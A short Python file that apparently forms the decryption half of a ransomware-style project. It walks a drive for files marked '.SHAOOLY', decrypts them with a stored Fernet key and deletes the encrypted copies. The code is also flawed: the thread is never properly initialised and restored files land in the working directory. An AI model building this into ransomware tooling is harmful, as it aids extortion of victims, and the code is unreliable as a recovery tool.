from threading import Thread
import os
from cryptography.fernet import Fernet


class Decrypt(Thread):
    def __init__(self, drive):
        self.drive = drive

        with open("file_encryption_key.txt", 'rb') as key_file:
            key = key_file.read()
        self.fernet = Fernet(key)

    def run(self):
        for r, d, f in os.walk(self.drive):
            for file in f:
                filepath = os.path.join(r, file)
                filename = filepath.split('/')[-1].split(".")[0]
                if filepath.split('/')[-1].split(".")[-1] == "SHAOOLY":
                    with open(filepath, 'r') as enc_file:
                        file_content = enc_file.read().split('\n')
                    ext = file_content[0]
                    file_name_with_ext = f'{filename}.{ext}'
                    with open(file_name_with_ext, 'wb') as dec_file:
                        dec_file.write(self.fernet.decrypt(file_content[1].encode()))
                    os.remove(filepath)
